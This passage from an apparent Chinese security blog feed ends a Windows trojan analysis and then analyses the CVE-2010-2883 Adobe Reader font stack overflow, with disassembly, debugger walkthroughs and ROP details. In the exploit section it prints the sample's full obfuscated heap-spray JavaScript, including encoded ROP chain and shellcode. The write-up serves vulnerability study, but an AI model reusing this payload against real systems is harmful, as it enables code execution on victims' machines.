title="img"></li></ul><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/c4ba2cbf-d131-48a0-8ff5-79ef23e33bcc.png" class="" title="img"><ul><li>再往下找一下发现有创建远程线程的地方<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/8b729e66-cc45-4a6d-a2d2-5e687462bee3.png" class="" title="img"></li><li>另开一个OD附加一下msiexec.exe这个进程<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/173a226d-f97b-40a2-92d3-88e2af7ef0f7.png" class="" title="img"></li><li>这里需要修改一下调试设置，接下来调试用（因为接下来createremotethread要在这个进程里面创建新的线程）<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/fc2b7683-2209-48a7-a8b1-2226a79e5913.jpg" class="" title="img"></li><li>运行到创建远程线程结束<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/d9520cf3-5d89-4ce6-adab-79d88e4d588e.png" class="" title="img"></li><li>因为我们刚才设置了中断于新线程，所以直接运行（F9）就会断在创建新线程的地方</li><li>发现这个地方似曾相识<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/eca5c4da-2678-4e8e-918e-49fa0555ba41.png" class="" title="img"></li><li>没错，这个地方循环解密后就是这个函数入口了，和刚才的入口是一样的<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/fc5045d2-e39a-4d8b-808b-25a7144af06d.png" class="" title="img"></li><li>继续跟进<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/8232d7de-931f-4147-97c4-dd8c4a913e6c.png" class="" title="img"></li><li>这里同样是在修复各个区段<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/78173e8a-9fa4-4017-9855-d19f4b99bd0d.png" class="" title="img"></li><li>上面一个函数出来之后继续跟进下一个<br><strong>发现这里传进去了一个PE文件</strong>进去看一下<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/ac302c10-9626-47d8-849c-3b94eab358f8.png" class="" title="img"><strong>这里可以用loadPE（以管理员权限打开）从10000000将这整个文件dump出来，用IDA辅助分析</strong></li><li>用loadPEdump这样直接从内存中dump出来它的对齐粒度是1000所以要修改一下,改为内存对齐.<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/f4843a5b-8ac6-4295-8f01-ac80a9dad61a.jpg" class="" title="img"><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/6fa79227-ef3d-4542-8feb-b6bc03f30ca0.jpg" class="" title="img"></li><li>跟进这里面看一下<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/136657ca-203c-4278-aba7-5d2b7b59a255.png" class="" title="img"></li><li>创建目录&gt;拼接路径<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/081776c2-e2a8-426e-bd11-c45a1c4dc4a3.png" class="" title="img"><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/4fcd1911-47dd-4991-9037-d70846fa5471.png" class="" title="img"></li><li>设置注册表键值<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/f0473f82-6fe3-468a-9281-e1dc3311b417.png" class="" title="img"></li><li>打开网络链接<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/54214749-d668-4903-b37d-b537668addf9.png" class="" title="img"><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/b490ece7-6e2f-48bf-abdc-0fc8810214d1.png" class="" title="img">-跟进函数看一下<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/44343cf0-d018-4672-8dfd-19ed54eae2f3.png" class="" title="img"></li><li>这里面有上传和下载的函数但是网站已经废了，我们进去就崩溃了<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/f5cdbaf8-2be5-427b-9428-a76e3c41a381.png" class="" title="img"></li></ul><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/a1c7b25b-9da8-4888-8490-753e0c90a015.png" class="" title="img"><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/0353dc7e-2674-42a3-a2a9-c8bd5e7bc90d.png" class="" title="img"><ul><li>我们需要在会崩溃的地方改跳转不去执行<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/cfc90d64-144f-44fa-a50d-808a0c4b5837.png" class="" title="img"></li><li>跟了一下发现获取主机名的时候会崩溃（所以就改跳转不去执行了）<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/d734b48a-841c-4e25-beab-2f6ca8a4b52e.png" class="" title="img"></li><li>获取电脑名和用户名<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/c4e6e22c-3dd1-47d1-a9cf-43052e98a2a6.png" class="" title="img"><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/6f5fd45a-363e-4df5-b1f4-3648d7cf9c2d.png" class="" title="img"></li><li>有些地方实在没办法过去就修改eip直接跳过这个函数<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/7d9066f5-f2c5-4658-9fa7-6ac4fe329338.png" class="" title="img"></li><li>建立连接从网站上读取文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/a7724282-bb62-4ef3-9f6d-6e63f457abf8.png" class="" title="img"></li><li>给网站发送消息并查看是否返回错误信息<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/b698e5c1-6f09-4b47-8407-e471d9b5480c.png" class="" title="img"></li><li>检索当前用的磁盘驱动器<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/3d13441a-5579-43f1-8a26-4684d8bf8d80.png" class="" title="img"></li><li>获取进程信息<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/7748befd-1afa-4b0e-974c-0ddeef1c3ff9.png" class="" title="img"></li><li>上传，下载内容<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/b54dd262-dda2-456c-bf40-215c38a61bb4.png" class="" title="img"></li><li>写文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/7351ddef-f311-4373-9b72-7f647430ebf5.png" class="" title="img"></li><li>关闭其它进程和线程与服务器断开连接<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/23527c1f-1da8-403d-8a8f-f48344771b2f.png" class="" title="img"><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/115b22d5-047d-47ad-94a2-56f0a216595a.png" class="" title="img"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</title>
      <link href="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="0x1：漏洞描述"><a href="#0x1：漏洞描述" class="headerlink" title="0x1：漏洞描述"></a>0x1：漏洞描述</h3><p>​CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的PDF文件就有可能导致执行任意代码。</p><h3 id="0x2：分析环境"><a href="#0x2：分析环境" class="headerlink" title="0x2：分析环境"></a>0x2：分析环境</h3><table><thead><tr><th align="left"></th><th>推荐使用的环境</th><th>备注</th></tr></thead><tbody><tr><td align="left">操作系统</td><td>Windows XP SP3</td><td>简体中文版</td></tr><tr><td align="left">虚拟机</td><td>VMware</td><td></td></tr><tr><td align="left">调试器</td><td>OD</td><td></td></tr><tr><td align="left">反汇编器</td><td>IDA Pro</td><td>6.8</td></tr><tr><td align="left">漏洞软件</td><td>Adobe Reader</td><td>9.3.4</td></tr></tbody></table><span id="more"></span><h3 id="0x3：基于字符串定位的漏洞分析方法"><a href="#0x3：基于字符串定位的漏洞分析方法" class="headerlink" title="0x3：基于字符串定位的漏洞分析方法"></a>0x3：基于字符串定位的漏洞分析方法</h3><p>​用IDA反汇编CoolType.dll库，查看字符串可发现”SING”字体，因为该字符串是漏洞解析出错的地方，直接定位进去即可查看该库对string表格的解析方式，==主要是strcat造成的溢出漏洞==：</p><pre><code class="asm">.text:0803DCF9.text:0803DCF9 ; =============== S U B R O U T I N E =======================================.text:0803DCF9.text:0803DCF9 ; Attributes: bp-based frame fpd=108h.text:0803DCF9.text:0803DCF9 sub_803DCF9     proc near               ; CODE XREF: sub_803A3B2+55p.text:0803DCF9                                         ; sub_803DFF4+28p ....text:0803DCF9.text:0803DCF9 var_160         = byte ptr -160h.text:0803DCF9 var_140         = dword ptr -140h.text:0803DCF9 var_138         = dword ptr -138h.text:0803DCF9 var_134         = dword ptr -134h.text:0803DCF9 var_130         = dword ptr -130h.text:0803DCF9 var_12C         = dword ptr -12Ch.text:0803DCF9 var_128         = dword ptr -128h.text:0803DCF9 var_124         = dword ptr -124h.text:0803DCF9 var_120         = dword ptr -120h.text:0803DCF9 var_119         = byte ptr -119h.text:0803DCF9 var_114         = dword ptr -114h.text:0803DCF9 var_10C         = dword ptr -10Ch.text:0803DCF9 var_108         = byte ptr -108h.text:0803DCF9 var_4           = dword ptr -4.text:0803DCF9 arg_0           = dword ptr  8.text:0803DCF9 arg_4           = dword ptr  0Ch.text:0803DCF9 arg_8           = dword ptr  10h.text:0803DCF9 arg_C           = dword ptr  14h.text:0803DCF9.text:0803DCF9                 push    ebp.text:0803DCFA                 sub     esp, 104h;分配栈空间0x104.text:0803DD00                 lea     ebp, [esp-4];后面的strcat会把执行结果保存在ebp中.text:0803DD04                 mov     eax, ___security_cookie.text:0803DD09                 xor     eax, ebp.text:0803DD0B                 mov     [ebp+108h+var_4], eax.text:0803DD11                 push    4Ch.text:0803DD13                 mov     eax, offset sub_8184A54.text:0803DD18                 call    __EH_prolog3_catch.text:0803DD1D                 mov     eax, [ebp+108h+arg_C].text:0803DD23                 mov     edi, [ebp+108h+arg_0].text:0803DD29                 mov     ebx, [ebp+108h+arg_4].text:0803DD2F                 mov     [ebp+108h+var_130], edi.text:0803DD32                 mov     [ebp+108h+var_138], eax.text:0803DD35                 call    sub_804172C.text:0803DD3A                 xor     esi, esi.text:0803DD3C                 cmp     dword ptr [edi+8], 3.text:0803DD40                 mov     [ebp+108h+var_10C], esi.text:0803DD43                 jz      loc_803DF00.text:0803DD49                 mov     [ebp+108h+var_124], esi.text:0803DD4C                 mov     [ebp+108h+var_120], esi.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1.text:0803DD57                 jnz     loc_803DEA9.text:0803DD5D                 push    offset aName    ; "name".text:0803DD62                 push    edi             ; int.text:0803DD63                 lea     ecx, [ebp+108h+var_124].text:0803DD66                 mov     [ebp+108h+var_119], 0.text:0803DD6A                 call    sub_80217D7.text:0803DD6F                 cmp     [ebp+108h+var_124], esi.text:0803DD72                 jnz     short loc_803DDDD.text:0803DD74                 push    offset aSing    ; "SING".text:0803DD79                 push    edi             ; int.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C];指向sing表入口.text:0803DD7D                 call    sub_8021B06   ;处理SING表.text:0803DD82                 mov     eax, [ebp+108h+var_12C].text:0803DD85                 cmp     eax, esi;判断是否为空.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2.text:0803DD8B                 jz      short loc_803DDC4 ;这里不跳转.text:0803DD8D                 mov     ecx, [eax];字体资源版本号，这里为1.0版本即00 10 00 00.text:0803DD8F                 and     ecx, 0FFFFh.text:0803DD95                 jz      short loc_803DD9F ;这里跳转.text:0803DD97                 cmp     ecx, 100h.text:0803DD9D                 jnz     short loc_803DDC0.text:0803DD9F.text:0803DD9F loc_803DD9F:                              ; CODE XREF: sub_803DCF9+9Cj.text:0803DD9F                 add     eax, 10h;相对string表偏移0x10处找到uniqueName.text:0803DDA2                 push    eax               ; char * uniqueName域.text:0803DDA3                 lea     eax, [ebp+108h+var_108].text:0803DDA6                 push    eax               ; char * 目的地址是一段固定大小的栈空间.text:0803DDA7                 mov     [ebp+108h+var_108], 0.text:0803DDAB                 call    strcat;造成溢出！！</code></pre><ul><li>由上可知，Adobe Reader在调用strcat的时候，未对uniqueName字段的字符串长度进行检测，将其直接复制到固定大小的栈空间中，最终导致栈溢出。</li></ul><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201013235707085.png" class="" title="image-20201013235707085"><h3 id="0x4：样本Exploit技术分析"><a href="#0x4：样本Exploit技术分析" class="headerlink" title="0x4：样本Exploit技术分析"></a>0x4：样本Exploit技术分析</h3><p>​用PdfStreamDumperd找到TTF并保存至本地</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201028234333765.png" class="" title="image-20201028234333765"><center>找到TTF位置</center><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201028234401837.png" class="" title="image-20201028234401837"><center>将TTF文件保存至本地</center><p>​TableEntry结构数据</p><pre><code class="c"> typedef sturct_SING {     char tag[4];//"SING"     ULONG checkSum;//校验和     ULONG offset;//相对文件偏移，0000011C     ULONG length;//数据长度 } TableEntry;</code></pre><p>​保存下来之后我们可以用010Edit加载TTF模板来查看一下文件的结构，找到SING表的真实数据，</p><p>​从TableEntry结构入口偏移0x11C即是SING表的真实数据，从<strong>00 00 01 00</strong> 开始的部分，接着再偏移0x10即可找到uniqueName域</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109215720617.png" class="" title="image-20201109215720617"><center>uniqueName域</center><p>​<strong>00 00 01 00</strong> 表示版本号，偏移0x10开始为uniqueName字段，大小为28字节且以0x00结尾。但是在CoolType.dll中，使用strcat对这个位置进行操作时没有判断长度，所以我们可以构造超长的uniqueName进行栈溢出。</p><h3 id="0x05：动态调试"><a href="#0x05：动态调试" class="headerlink" title="0x05：动态调试"></a>0x05：动态调试</h3><p>​用OD加载Adobe Reader 按F9直接运行，运行起来之后在<strong>0x0803DD74</strong>（前面我们通过IDA找到的加载SING表的位置）下断点，然后打开poc.pdf。程序会断在此处。</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201029235903195.png" class="" title="image-20201029235903195"><p>​然后向下单步执行，在0X0803DD7A执行完之后，可以看到ECX被从栈中赋了一个值</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201104211542610.png" class="" title="image-20201104211542610"><p>​我们查看一下这个值中保存的内容，拿这个值跟上面通过010Edit查看到的值对比发现是一样的，可以判断这里存放的是SING表的数据。</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201104211659428.png" class="" title="image-20201104211659428"><p>继续往下调试可以看到这里有个call，看一下参数明显是吧SING字符串当错参数传入进去了，F8步过继续往下调试。</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109201540699.png" class="" title="image-20201109201540699"><p>这里看一下eax的值可以比较一下跟SING表入口的数据是一样的，这样我们可以猜测上面那个call的作用是用来取出SING表的数据<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109211515283.png" class="" title="image-20201109211515283"></p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109215720617.png" class="" title="image-20201109215720617"><p>再继续往下调试我们就能找到上面再IDA里面找到的溢出点。这里我们可以看一下传递给strcat的参数，通过对比发现这个地址存放的是uniquename。继续F8执行。</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109233420281.png" class="" title="image-20201109233420281"><p>执行strcat之后，会将<strong>58 E0 8D AD</strong> 起始的部分复制到ebp的指定地址（0x0012e4d8)，直至遇到NULL字符终止。我们对复制进去的这段数据（ebp指向的地址）设置内存访问断点，F9执行。</p><p>第一次断在字符串拷贝，每次拷贝一个字节，循环拷贝。</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109235316562.png" class="" title="image-20201109235316562"><p>第二个地方断在字符串开始的地方，每次比较一个字节。</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109235551091.png" class="" title="image-20201109235551091"><p>继续往下跟踪可以找到下图的位置，0x4A8A08E2是样本中的数据，该地址必须为可读可写的，否则会导致出现异常。</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110000836183.png" class="" title="image-20201110000836183"><p>继续执行下去将看到下图所示的地址。此处的call [eax]指令，[eax]=0x4A80CB38 (icucnv36.4A80CB38)</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110001742314.png" class="" title="image-20201110001742314"><p>此地址对应的指令为：</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110002213991.png" class="" title="image-20201110002213991"><center>ROP指令1</center><p>返回之后：</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110002529870.png" class="" title="image-20201110002529870"><center>ROP指令2</center><p>我们再来看下TTF流中的样本数据，可以找到上面基础关键跳转地址的踪影：</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110002842137.png" class="" title="image-20201110002842137"><p>跳转地址的稳定性其实主要依靠0x4A82A714和0x4A80CB38这两处地址，他们都位于icucnv36这块地址空间内，而在Adove Reader的各个版本上，这个dll上的这两处地址是始终不变的，因而保持了各个版本的兼容性和Exploit的稳定性。上面的0C0C0C0C正式样本特意构造的，然后再通过嵌入到PDF的JavaScript实现Heap Spary，进而跳入Shellcode执行代码。0x0C0C0C0C正是绕过DEP的关键部分，它是利用ROP技术实现的。</p><p>借助PdfStreamDumper来提取样本中的JavaScript代码。</p><pre><code class="javascript">var qXtjjwuwMZHJFnHFHIeKMsuymSwbvdoCpVQWidsXxgdOevIIdJDueXNhhaFuWpjEXlNYkQBcmKusAxoTqqySheWldNrQ = unescape;var TuBHhjKjSQNWxYdXhwSUaUeAfYLLCe = qXtjjwuwMZHJFnHFHIeKMsuymSwbvdoCpVQWidsXxgdOevIIdJDueXNhhaFuWpjEXlNYkQBcmKusAxoTqqySheWldNrQ( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ue9bd%u49c0%udd6d%ud9c5%u2474%u5ff4%uc929%u31b1%u6f31%u8313%u04c7%u6f03%u22e6%u91bc%u2010%u6a3f%u45e0%u8fc9%u45d1%uc4ad%u7641%u89a5%ufd6d%u39eb%u73e6%u4d24%u394f%u6012%u1250%ue366%u69d2%uc3bb%ua1eb%u02ce%udf2c%u5623%uabe5%u4796%ue682%ue32a%ue7d8%u102a%u06a8%u871a%u50a3%u29bc%ue960%u31f5%ud465%uc94c%ua25d%u1b4e%u4bac%u62fc%ube01%ua3fc%u21a5%udd8b%udcd6%u198c%u3aa5%uba18%uc80d%u66ba%u1dac%uec5c%ueaa2%uaa2a%ueda6%uc0ff%u66d2%u06fe%u3c53%u8325%ue638%u9244%u49e4%uc478%u3547%u8edc%u2265%ucd6d%ub5e3%u6be3%ub541%u73fb%udef5%uf8ca%u999a%u2ad2%u56df%u7799%uff49%ue244%u62c8%ud877%u9b0e%ue9f4%u58ee%u9be4%u25eb%u70a2%u3681%u7747%u3636%u1442%ua4d9%uf50e%u4d7c%u09b4' );var hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw = qXtjjwuwMZHJFnHFHIeKMsuymSwbvdoCpVQWidsXxgdOevIIdJDueXNhhaFuWpjEXlNYkQBcmKusAxoTqqySheWldNrQ( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );while (hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw.length + 20 + 8 &lt; 65536) hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw+=hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw;AMdepunMDlBdcASwQxIXPGLFXVNQnQrUurHez = hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw.substring(0, (0x0c0c-0x24)/2);AMdepunMDlBdcASwQxIXPGLFXVNQnQrUurHez += TuBHhjKjSQNWxYdXhwSUaUeAfYLLCe;AMdepunMDlBdcASwQxIXPGLFXVNQnQrUurHez += hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw;JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB = AMdepunMDlBdcASwQxIXPGLFXVNQnQrUurHez.substring(0, 65536/2);while(JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB.length &lt; 0x80000) JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB += JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB;GpzjaZkwEGsG = JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB.substring(0, 0x80000 - (0x1020-0x08) / 2);var KkRYrQKZaeEulhPvabpTanhXVgnMmalrmTtKTmlkSrkkgM = new Array();for (MHzOuXylamFYTUBOrCPPWcbkWJOMFnTFvtCRiJjNnptuQTlkQCNqlNGacncSxbbglbfBlfqsfqUHNE=0;MHzOuXylamFYTUBOrCPPWcbkWJOMFnTFvtCRiJjNnptuQTlkQCNqlNGacncSxbbglbfBlfqsfqUHNE&lt;0x1f0;MHzOuXylamFYTUBOrCPPWcbkWJOMFnTFvtCRiJjNnptuQTlkQCNqlNGacncSxbbglbfBlfqsfqUHNE++) KkRYrQKZaeEulhPvabpTanhXVgnMmalrmTtKTmlkSrkkgM[MHzOuXylamFYTUBOrCPPWcbkWJOMFnTFvtCRiJjNnptuQTlkQCNqlNGacncSxbbglbfBlfqsfqUHNE]=GpzjaZkwEGsG+"s";</code></pre><p>当返回到栈顶（0C0C0C0C)后，栈的情况如下所示。</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110004506163.png" class="" title="image-20201110004506163"><p>栈中的数据便是上面JS代码中的Shellcode，作者也正是利用它来实现ROP绕过DEP保护的。首先进入0x4A8063A5，然后再依次执行下面的ROP指令</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110004824363.png" class="" title="image-20201110004824363"><center>ROP指令3</center><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005023971.png" class="" title="image-20201110005023971"><center>ROP指令4</center><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005125716.png" class="" title="image-20201110005125716"><center>构造CreaterFileA函数地址的ROP指令</center><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005307611.png" class="" title="image-20201110005307611"><center>调用CreateFileA函数</center><p>调用CreateFileA函数时,栈上对应的各个参数情况如图所示，它创建了一个名为iso88591的文件</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005501083.png" class="" title="image-20201110005501083"><p>返回之后，再通过跟上面相同的手法构造出ROP指令来调用CreateFileMapping,创建文件内存映射，调用CreateFileMapping时的栈中各个参数如下图</p><img 